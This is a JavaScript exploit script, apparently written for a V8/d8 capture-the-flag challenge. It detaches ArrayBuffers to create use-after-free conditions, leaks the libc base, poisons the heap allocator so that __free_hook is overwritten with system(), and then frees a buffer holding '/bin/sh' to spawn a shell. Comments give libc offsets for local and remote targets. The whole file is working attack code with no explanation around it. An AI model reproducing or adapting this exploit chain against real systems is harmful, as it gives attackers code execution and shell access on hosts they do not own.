function b2i(a){
    var b = new BigUint64Array(a.buffer);
    return b[0];
}

function i2l(i){
    var b = new Uint8Array(BigUint64Array.from([i]).buffer);
    return b;
}

function hex(i){
    return '0x'+i.toString(16).padStart(16, '0');
}

function malloc(size){
    var chunk = {};
    chunk.length = size;
    var addr = new Uint8Array(chunk);
    return addr;
}

var chunk0 = new Uint8Array(0x1000);
//%DebugPrint(chunk0.buffer);
var chunk1 = new Uint8Array(0x1000);
//%DebugPrint(chunk1.buffer);
var chunk2 = new Uint8Array(0x1000);
//%DebugPrint(chunk2.buffer);
var chunk3 = new Uint8Array(0x1000);

%ArrayBufferDetach(chunk0.buffer);
%ArrayBufferDetach(chunk1.buffer);
chunk2.set(chunk1);

//%SystemBreak();


var libc_base = b2i(chunk2.slice(8, 16)) - 0x3ebca0n;

var system = libc_base + 0x4f550n    //local
var free_hook = libc_base + 0x3ed8e8n //local

//var free_hook = libc_base + 0x3ed8e8n
//var system = libc_base + 0x4f4e0n       //remote: 0x4f440n
console.log('libc_base: '+hex(libc_base));
//%SystemBreak();

var chunk4 = new Uint8Array(0x300);
//%DebugPrint(chunk4.buffer);
var chunk5 = new Uint8Array(0x300);
//%DebugPrint(chunk5.buffer);

%ArrayBufferDetach(chunk4.buffer);
%ArrayBufferDetach(chunk5.buffer);

//%SystemBreak();

chunk5.set(i2l(free_hook));
var chunk6 = malloc(0x300);
//%DebugPrint(chunk6.buffer);
var chunk7 = malloc(0x300);
//%DebugPrint(chunk7.buffer);
chunk7.set(i2l(system));
//%SystemBreak();

chunk6[0] = 0x2f;
chunk6[1] = 0x62;
chunk6[2] = 0x69;
chunk6[3] = 0x6e;
chunk6[4] = 0x2f;
chunk6[5] = 0x73;
chunk6[6] = 0x68;
chunk6[7] = 0x00;

%ArrayBufferDetach(chunk6.buffer);
